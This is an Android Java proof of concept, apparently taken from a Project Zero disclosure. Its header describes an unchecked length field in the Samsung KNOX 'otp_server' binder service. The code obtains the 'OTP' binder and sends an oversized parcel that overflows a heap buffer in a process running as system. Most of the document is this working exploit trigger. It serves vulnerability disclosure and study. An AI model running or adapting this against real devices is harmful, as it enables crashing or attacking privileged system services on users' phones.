/**
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=935

As a part of the KNOX extensions available on Samsung devices, Samsung provides a new service which allows the generation of OTP tokens.

The tokens themselves are generated in a TrustZone application within the TEE (UID: fffffffff0000000000000000000001e). However, in order to allow easy communication between the Non-secure World (NWD) and the Secure-World (SW) trustlet, a new server has been created. This server, called "otp_server", publishes a binder service called "OTP".

The service provides a single command via binder (command code 2), which allows a client to provide a buffer from the NWD to be sent to the SW. The requests are serialized to the parcel as a 32-bit length field, followed by the actual request data.

However, "otp_server" does not validate the request length field at all, allowing an attacker to specify any value. This length field is then used in a "memcpy" call in order to copy the data from the parcel to an internal heap-allocated buffer.

On the device I'm working on (SM-G925V), the "OTP" service can be accessed from any user, and the "otp_server" process runs with UID system and context "u:r:otp_server:s0".

I've attached a small PoC which can be used to trigger the overflow. Running it should crash "otp_server".
*/

package com.example.laginimaineb.otp;

import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

	/**
 	 * The logtag used.
	 */
	private static final String LOGTAG = "OTP_TEST";

	/**
 	 * The name of the OTP binder service.
	 */
	private static final String INTERFACE_DESCRIPTOR = "OTP";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		try {
			//Getting the binder
			Class smClass = Class.forName("android.os.ServiceManager");
			IBinder binder = (IBinder) smClass.getMethod("getService", String.class).invoke(null, INTERFACE_DESCRIPTOR);

			//Creating a connection
			Parcel parcel = Parcel.obtain();
			Parcel reply = Parcel.obtain();
			parcel.writeInterfaceToken(INTERFACE_DESCRIPTOR);
			int length = 0xFFFF;
			parcel.writeInt(length); //Buffer length
			for (int i = 0; i < length/4 + 1; i++)
				parcel.writeInt(0xABABABAB);
			binder.transact(2, parcel, reply, 0);
			reply.recycle();
			parcel.recycle();

		} catch (RemoteException ex) {
		    Log.e(LOGTAG, "Failed to communicate with remote binder", ex);
		}
	}
}